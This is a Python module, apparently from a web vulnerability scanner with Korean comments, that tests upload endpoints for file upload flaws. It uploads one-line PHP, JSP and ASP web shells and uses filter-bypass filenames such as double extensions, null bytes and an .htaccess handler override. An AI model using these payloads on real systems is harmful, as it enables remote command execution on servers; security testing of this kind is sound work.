"""
File Upload Vulnerability (파일 업로드 취약점)
웹 쉘 업로드, 실행 파일 업로드 탐지
"""
import requests
import os

def scan(target_url):
    result = {
        'name': 'File Upload (파일 업로드)',
        'category': 'File Security',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': '파일 확장자 검증(화이트리스트), 실행 권한 제거, 파일명 난수화, 저장 경로 분리',
        'details': ''
    }
    
    details = []
    
    # 테스트할 파일 업로드 엔드포인트
    upload_endpoints = [
        f"{target_url}/api/teams/1/files",
        f"{target_url}/api/upload",
        f"{target_url}/api/file/upload",
    ]
    
    # 웹 쉘 테스트 파일 내용
    web_shell_php = "<?php system($_GET['cmd']); ?>"
    web_shell_jsp = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    web_shell_asp = "<% eval request(\"cmd\") %>"
    
    # 테스트 시나리오
    test_cases = [
        ('test.php', web_shell_php, 'application/x-php', 'PHP Web Shell'),
        ('test.jsp', web_shell_jsp, 'application/x-jsp', 'JSP Web Shell'),
        ('test.asp', web_shell_asp, 'text/asp', 'ASP Web Shell'),
        ('test.exe', 'MZ...', 'application/x-msdownload', 'Executable File'),
        ('test.html', '<script>alert(1)</script>', 'text/html', 'HTML File (XSS)'),
    ]
    
    details.append("[파일업로드-1] 위험한 확장자 업로드 테스트")
    
    for endpoint in upload_endpoints:
        for filename, content, content_type, desc in test_cases:
            try:
                # 파일 객체 생성
                files = {
                    'file': (filename, content, content_type)
                }
                
                # 추가 파라미터 (일부 시스템에서 요구할 수 있음)
                data = {'folderPath': '/'}
                
                headers = {'X-Security-Mode': 'vulnerable'}
                
                # 업로드 요청
                resp = requests.post(endpoint, files=files, data=data, headers=headers, timeout=5)
                
                # 업로드 성공 여부 확인
                # 200/201 응답이고, 에러 메시지가 없으면 성공으로 간주
                if resp.status_code in [200, 201]:
                    # 응답에 업로드된 파일 경로가 포함되어 있는지 확인
                    if 'storedName' in resp.text or 'filePath' in resp.text or 'url' in resp.text:
                        result['vulnerabilities'].append(f"위험한 파일 업로드 허용: {filename} ({desc})")
                        details.append(f"  ✗ {desc} 업로드 성공: {endpoint}")
                        result['status'] = 'VULNERABLE'
                        
                        # 업로드된 파일 실행 가능 여부 확인 (경로 추측)
                        # 실제로는 응답에서 경로를 파싱해야 함
                        details.append(f"    -> 업로드된 파일 실행 가능성 확인 필요")
                    else:
                        details.append(f"  ⚠ {desc} 업로드 응답 200 (성공 여부 불확실)")
                elif resp.status_code == 403 or resp.status_code == 400:
                    details.append(f"  ✓ {desc} 차단됨 ({resp.status_code})")
                else:
                    details.append(f"  • {desc} 상태 코드: {resp.status_code}")
                    
            except Exception as e:
                pass
                
            if result['status'] == 'VULNERABLE':
                break
        
        if result['status'] == 'VULNERABLE':
            break
            
    # 2. 파일명 조작 및 우회 기법
    details.append("\n[파일업로드-2] 우회 기법 테스트")
    
    bypass_cases = [
        ('test.php.jpg', web_shell_php, 'image/jpeg', 'Double Extension'),
        ('test.php%00.jpg', web_shell_php, 'image/jpeg', 'Null Byte Injection'),
        ('test.pHp', web_shell_php, 'application/x-php', 'Case Sensitivity'),
        ('.htaccess', 'SetHandler application/x-httpd-php', 'text/plain', '.htaccess Upload'),
    ]
    
    for endpoint in upload_endpoints:
        for filename, content, content_type, desc in bypass_cases:
            try:
                files = {'file': (filename, content, content_type)}
                headers = {'X-Security-Mode': 'vulnerable'}
                
                resp = requests.post(endpoint, files=files, headers=headers, timeout=5)
                
                if resp.status_code in [200, 201]:
                    result['vulnerabilities'].append(f"업로드 필터링 우회: {desc}")
                    details.append(f"  ✗ {desc} 성공")
                    result['status'] = 'VULNERABLE'
                    break
            except:
                pass
        
        if result['status'] == 'VULNERABLE':
            break
    
    if result['status'] == 'SAFE':
        details.append("\n✓ 파일 업로드 취약점이 발견되지 않았습니다")
    
    result['details'] = '\n'.join(details)
    return result
